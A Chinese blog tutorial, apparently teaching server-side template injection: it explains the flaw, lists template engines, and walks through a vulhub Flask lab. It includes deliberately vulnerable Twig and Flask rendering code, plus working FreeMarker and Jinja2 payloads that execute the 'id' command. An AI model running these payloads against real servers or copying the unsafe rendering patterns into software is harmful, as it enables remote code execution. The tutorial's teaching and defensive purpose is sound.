@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>SSTI漏洞初手入门 - 编程中国的博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="SSTI漏洞初手入门" />
+<meta property="og:description" content="目录
+0x01 什么是SSTI
+0x02 漏洞存在位置
+0x03 漏洞如何发掘检测
+0x04 漏洞复现
+0X05 防御方法 0x01 什么是SSTI SSTI，即服务器端模板注入（Server-Side Template Injection）。攻击者在服务器输入语句，服务端将其作为Web应用模板内容的一部分，在进行目标编译渲染的过程中，进行了语句的拼接，执行了所插入的恶意内容，从而导致信息泄露、代码执行、GetShell等问题。
+补充：
+1）模板引擎是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的文档，就是将模板文件和数据通过模板引擎生成一个HTML代码。
+2）模板注入请不要认为只存在于 Python 中，凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是。
+0x02 漏洞存在位置 常见的模板引擎：
+1、php 常用的 --Smarty Smarty算是一种很老的PHP模板引擎了，非常的经典，使用的比较广泛 --Twig Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。 --Blade Blade 是 Laravel 提供的一个既简单又强大的模板引擎。 2、Java 常用的 --JSP 这个引擎我想应该没人不知道吧，这个应该也是我最初学习的一个模板引擎，非常的经典 --FreeMarker FreeMarker是一款模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本（HTML网页、电子邮件、配置文件、源代码等）的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。 --Velocity Velocity作为历史悠久的模板引擎不单单可以替代JSP作为Java Web的服务端网页模板引擎，而且可以作为普通文本的模板引擎来增强服务端程序文本处理能力。 3、Python 常用的 --Jinja2 flask jinja2 一直是一起说的，使用非常的广泛，是我学习的第一个模板引擎 --django django 应该使用的是专属于自己的一个模板引擎，我这里姑且就叫他 django，我们都知道 django 以快速开发著称，有自己好用的ORM，他的很多东西都是耦合性非常高的，你使用别的就不能发挥出 django 的特性了 --tornado tornado 也有属于自己的一套模板引擎，tornado 强调的是异步非阻塞高并发 SSTI 产生实例：" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/e20f5a442d09a92d7c33393d8752d89a/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-01-08T20:12:51+08:00" />
+<meta property="article:modified_time" content="2022-01-08T20:12:51+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程中国的博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">SSTI漏洞初手入门</h1>
+			
+		</header>
+		<div id="gatop"></div>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="htmledit_views">
+                    <p id="main-toc"><strong>目录</strong></p> 
+<p id="0x01%20%E4%BB%80%E4%B9%88%E6%98%AFSSTI-toc" style="margin-left:40px;"><a href="#0x01%20%E4%BB%80%E4%B9%88%E6%98%AFSSTI" rel="nofollow">0x01 什么是SSTI</a></p> 
+<p id="0x02%20%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8%E4%BD%8D%E7%BD%AE-toc" style="margin-left:40px;"><a href="#0x02%20%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8%E4%BD%8D%E7%BD%AE" rel="nofollow">0x02 漏洞存在位置</a></p> 
+<p id="0x03%20%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E5%8F%91%E6%8E%98%E6%A3%80%E6%B5%8B-toc" style="margin-left:40px;"><a href="#0x03%20%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E5%8F%91%E6%8E%98%E6%A3%80%E6%B5%8B" rel="nofollow">0x03 漏洞如何发掘检测</a></p> 
+<p id="0x04%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-toc" style="margin-left:40px;"><a href="#0x04%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0" rel="nofollow">0x04 漏洞复现</a></p> 
+<p id="0X05%20%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95%C2%A0-toc" style="margin-left:40px;"><a href="#0X05%20%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95%C2%A0" rel="nofollow">0X05 防御方法 </a></p> 
+<hr id="hr-toc"> 
+<h3 id="0x01%20%E4%BB%80%E4%B9%88%E6%98%AFSSTI" style="margin-left:0px;">0x01 什么是SSTI</h3> 
+<p style="margin-left:0;">        SSTI，即服务器端模板注入（Server-Side Template Injection）。攻击者在服务器输入语句，服务端将其作为Web应用模板内容的一部分，在进行目标编译渲染的过程中，进行了语句的拼接，执行了所插入的恶意内容，从而导致信息泄露、代码执行、GetShell等问题。</p> 
+<p style="text-align:center;"><img alt="" height="408" src="https://images2.imgbox.com/18/d1/Ovc576WX_o.png" width="1060"></p> 
+<p><strong>补充：</strong></p> 
+<p>        1）模板引擎是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的文档，就是将模板文件和数据通过模板引擎生成一个HTML代码。</p> 
+<p>        2）模板注入请不要认为只存在于 Python 中，凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是。</p> 
+<h3 id="0x02%20%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8%E4%BD%8D%E7%BD%AE" style="margin-left:0px;">0x02 漏洞存在位置</h3> 
+<p style="margin-left:0;">常见的模板引擎：</p> 
+<pre><code>1、php 常用的
+--Smarty
+	Smarty算是一种很老的PHP模板引擎了，非常的经典，使用的比较广泛
+--Twig
+	Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。
+--Blade
+    Blade 是 Laravel 提供的一个既简单又强大的模板引擎。
+			
+2、Java 常用的
+--JSP
+    这个引擎我想应该没人不知道吧，这个应该也是我最初学习的一个模板引擎，非常的经典
+--FreeMarker
+    FreeMarker是一款模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本（HTML网页、电子邮件、配置文件、源代码等）的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。
+--Velocity
+    Velocity作为历史悠久的模板引擎不单单可以替代JSP作为Java Web的服务端网页模板引擎，而且可以作为普通文本的模板引擎来增强服务端程序文本处理能力。
+			
+3、Python 常用的
+--Jinja2
+    flask jinja2 一直是一起说的，使用非常的广泛，是我学习的第一个模板引擎
+--django
+    django 应该使用的是专属于自己的一个模板引擎，我这里姑且就叫他 django，我们都知道 django 以快速开发著称，有自己好用的ORM，他的很多东西都是耦合性非常高的，你使用别的就不能发挥出 django 的特性了
+--tornado
+    tornado 也有属于自己的一套模板引擎，tornado 强调的是异步非阻塞高并发</code></pre> 
+<p style="margin-left:0;">SSTI 产生实例：</p> 
+<p style="margin-left:0;">1）PHP 实例</p> 
+<pre><code>&lt;?php
+require_once dirname(__FILE__).'/../lib/Twig/Autoloader.php';
+Twig_Autoloader::register(true);
+			
+$twig = new Twig_Environment(new Twig_Loader_String());
+$output = $twig-&gt;render("Hello {$_GET['name']}");   // 将用户输入作为模版内容的一部分
+echo $output;</code></pre> 
+<p style="margin-left:0;">开发者将用户的输入直接放在要渲染的字符串中了,  {}括号实际上只是为了区分变量和字符串常量而已。我们输入{<!-- -->{xxx}}就非常的符合模板的规则，模板引擎未经思考就给解析了，然后服务器就无了。</p> 
+<p style="margin-left:0;">2）Python 实例</p> 
+<pre><code>@app.errorhandler(404)
+def page_not_found(e):
+    template = '''{%% extends "layout.html" %%}
+    {%% block body %%}
+    &lt;div class="center-content error"&gt;
+    &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt;
+    &lt;h3&gt;%s&lt;/h3&gt;
+    &lt;/div&gt;
+    {%% endblock %%}
+    ''' % (request.url)   //使用了一个字符串的格式化来传递一个 url 
+    return render_template_string(template), 404  // 用模板的方式去渲染的</code></pre> 
+<p> 发现持模板引擎支持的语法，我们就能在URL后面跟上{<!-- -->{ 7*7 }}，自然而然就能计算出 49 了。</p> 
+<p style="margin-left:0;">3）JAVA 实例</p> 
+<p style="margin-left:0;">在2015年的blackhat 大会上曾讲述了Alfresco 的一个 SSTI 漏洞，简单的payload 分析一下。</p> 
+<p style="margin-left:0;">&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ ex("id") }</p> 
+<p style="margin-left:0;">这里面的 ?new() 是其高级内置函数，相当于调用了构造函数创建了一个对象，那么这个 payload 中就是调用的 freemarker 的内置执行命令的对象Execute</p> 
+<p style="margin-left:0;">结果：uid=119(tomcat7) gid=127(tomcat7) groups=127(tomcat7）</p> 
+<h3 id="0x03%20%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E5%8F%91%E6%8E%98%E6%A3%80%E6%B5%8B" style="margin-left:0px;">0x03 漏洞如何发掘检测</h3> 
+<p style="margin-left:0;">1）如同SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是传递特定 Payload的参数并根据返回的内容来判断是否存在的。每一个模板引擎都有着自己的语法，就如同 SQL 注入中有着不同的数据库类型一样。</p> 
+<p style="margin-left:0;">2）可按照下面的图进行测试,从而判断出是那个模板引擎，再去找对应的payload：</p> 
+<p style="margin-left:0px;text-align:center;"><img alt="" src="https://images2.imgbox.com/a5/06/9nGHelrm_o.png"></p> 
+<p> 3）注意：有的时候出现 XSS 的时候，也有可能是 SSTI 漏洞，虽说模板引擎在大多数情况下都是使用的xss 过滤的，但是也不排除有些意外情况的出现，比如有的模板引擎(比如 jinja2)在渲染的时候默认只针对特定的文件后缀名的文件(html,xhtml等)进行XSS过滤。</p> 
+<p style="margin-left:0;">4）提供一个大牛写的 SSTI 的检测工具 tplmap https://github.com/epinna/tplmap </p> 
+<p style="margin-left:0;">     项目中附带有docker环境，可供学习和熟悉 ----------- tplmap</p> 
+<h3 id="0x04%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0" style="margin-left:0px;">0x04 漏洞复现</h3> 
+<p style="margin-left:0;">用vulhub上的一个环境来复现Flask的SSTI漏洞</p> 
+<p style="margin-left:0;">1）docker环境搭建</p> 
+<p style="margin-left:0;">        cd /vulhub-master/flask/ssti</p> 
+<p style="margin-left:0;">        docker-compose up -d</p> 
+<p style="margin-left:0;">2）注入检测</p> 
+<p style="margin-left:0;">手工检测：</p> 
+<p style="text-align:center;"><img alt="" src="https://images2.imgbox.com/7a/e8/VXDYNdfb_o.png"></p> 
+<p> 上述工具检测：</p> 
+<p style="text-align:center;"><img alt="" src="https://images2.imgbox.com/de/c2/rBnMeaLR_o.png"></p> 
+<p> 3）漏洞利用</p> 
+<p style="margin-left:0;">官方给的漏洞利用方法：</p> 
+<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+	{% for b in c.__init__.__globals__.values() %}
+	{% if b.__class__ == {}.__class__ %}
+        {% if 'eval' in b.keys() %}
+		    {<!-- -->{ b['eval']('__import__("os").popen("id").read()') }}
+        {% endif %}
+    {% endif %}
+    {% endfor %}
+{% endif %}
+{% endfor %}</code></pre> 
+<p style="margin-left:0;">结果如下：</p> 
+<p style="text-align:center;"><img alt="" src="https://images2.imgbox.com/19/f8/6YVas7zH_o.png"></p> 
+<h3 id="0X05%20%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95%C2%A0">0X05 防御方法 </h3> 
+<p style="margin-left:0;">1）和其他的注入防御一样，绝对不要让用户对传入模板的内容或者模板本身进行控制</p> 
+<p style="margin-left:0;">2）减少或者放弃直接使用格式化字符串结合字符串拼接的模板渲染方式，使用正规的模板渲染方法</p>
+                </div>
+		</div>
+		<div id="gabottom"></div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/624e285f02ab674ae7da9e3efad265c2/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">一位21届信息管理与信息系统专业（信管）师兄过来人的看法</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/ce25e8b7584f5309374aac6ad09b254a/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">解决docker宿主机不能访问容器的问题</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 编程中国的博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<div id="gafoot"></div>
+<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
+<script src="https://101121.xyz/ga/app.js"></script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
